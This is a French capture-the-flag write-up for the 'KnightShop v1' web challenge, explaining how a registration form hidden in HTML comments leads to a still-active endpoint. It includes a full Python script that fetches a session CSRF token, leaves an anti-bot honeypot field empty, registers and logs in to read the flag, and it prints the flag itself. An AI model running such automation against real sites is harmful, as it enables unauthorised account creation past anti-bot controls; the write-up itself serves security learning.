# KnightShop v1 — Web

**URL :** `http://95.216.124.220:31218/`  
**Flag :** `CCOI26{m4nUal_regIstrAti0n_unl0cKs_tHe_shOp}`

---

## Découverte

En arrivant sur le site, la navbar ne montre qu'un bouton **Login** — aucune option pour s'inscrire. J'essaie d'aller directement sur `/register.php` au cas où... la page existe ! Mais le formulaire d'inscription standard n'est pas accessible depuis l'interface.

Je lis le code source de la page d'accueil (`view-source:`) et je tombe sur ça :

```html
< Hidden Registration Form -->
<!--
<div class="max-w-md mx-auto mt-10 bg-gray-800 p-8 rounded-xl">
    <h2 class="text-2xl font-bold mb-6 text-center">Create Account</h2>
    <form action="register.php" method="POST">
        <input type="hidden" name="csrf_token"
               value="7e156f5a9d28e759bfdc201a32fb452c25ff5f31a52009bf161db7a59c4f5f20">
        <input type="text" name="website" style="display:none">
        <input type="text"     name="username" ...>
        <input type="email"    name="email"    ...>
        <input type="password" name="password" ...>
        <button type="submit">Register</button>
    </form>
</div>
-->
```

Tout un formulaire d'inscription est commenté dans le HTML. L'endpoint `/register.php` existe bien, il était juste caché dans les commentaires. Deux choses importantes :
- Un champ `website` masqué avec `display:none` → **honeypot anti-bot**, il faut l'envoyer vide
- Le CSRF token dans le commentaire est probablement expiré — il faut en récupérer un frais depuis la même session

---

## Exploitation

### Récupérer un CSRF valide

Le CSRF token est lié à la session PHP. Il faut donc faire un GET sur `index.php` pour créer une session, puis extraire le token du commentaire HTML :

```python
import requests, re

BASE = "http://95.216.124.220:31218"
s = requests.Session()

r = s.get(f"{BASE}/index.php")
# le token dans le commentaire est celui de notre session courante
csrf = re.search(r'csrf_token.*?value="([^"]+)"', r.text).group(1)
```

### S'inscrire

```python
r_reg = s.post(f"{BASE}/register.php", data={
    "csrf_token": csrf,
    "username":   "rogue",
    "email":      "rogue@pwn.io",
    "password":   "Str0ng!Pass",
    "website":    ""    # honeypot — doit rester vide sinon l'inscription est rejetée
})
```

Après ça la page redirige vers `login.php` avec un message de succès.

### Se connecter

Le formulaire de login utilise `email` (pas `username`) et a son propre CSRF token :

```python
r_login_page = s.get(f"{BASE}/login.php")
csrf_login = re.search(r'name="csrf_token" value="([^"]+)"', r_login_page.text).group(1)

r_login = s.post(f"{BASE}/login.php", data={
    "csrf_token": csrf_login,
    "email":      "rogue@pwn.io",
    "password":   "Str0ng!Pass",
    "website":    ""
}, allow_redirects=True)
# → redirige vers /dashboard.php
```

Le dashboard affiche le flag directement.

---

## Script complet

```python
#!/usr/bin/env python3
import requests, re

BASE = "http://95.216.124.220:31218"
s = requests.Session()

# session + CSRF depuis le commentaire HTML
r = s.get(f"{BASE}/index.php")
csrf = re.search(r'csrf_token.*?value="([^"]+)"', r.text).group(1)

# inscription (honeypot website=vide obligatoire)
s.post(f"{BASE}/register.php", data={
    "csrf_token": csrf,
    "username":   "rogue",
    "email":      "rogue@pwn.io",
    "password":   "Str0ng!Pass",
    "website":    ""
})

# login
lp = s.get(f"{BASE}/login.php")
lcsrf = re.search(r'name="csrf_token" value="([^"]+)"', lp.text).group(1)
r2 = s.post(f"{BASE}/login.php", data={
    "csrf_token": lcsrf,
    "email":      "rogue@pwn.io",
    "password":   "Str0ng!Pass",
    "website":    ""
}, allow_redirects=True)

flags = re.findall(r'CCOI26\{[^}]+\}', r2.text)
print(flags[0])
```

Output :
```
CCOI26{m4nUal_regIstrAti0n_unl0cKs_tHe_shOp}
```

---

La vulnérabilité c'est du code HTML laissé en commentaire en production. L'endpoint `register.php` était toujours actif, seule l'interface était masquée. Il fallait juste lire le source.

**Flag : `CCOI26{m4nUal_regIstrAti0n_unl0cKs_tHe_shOp}`**
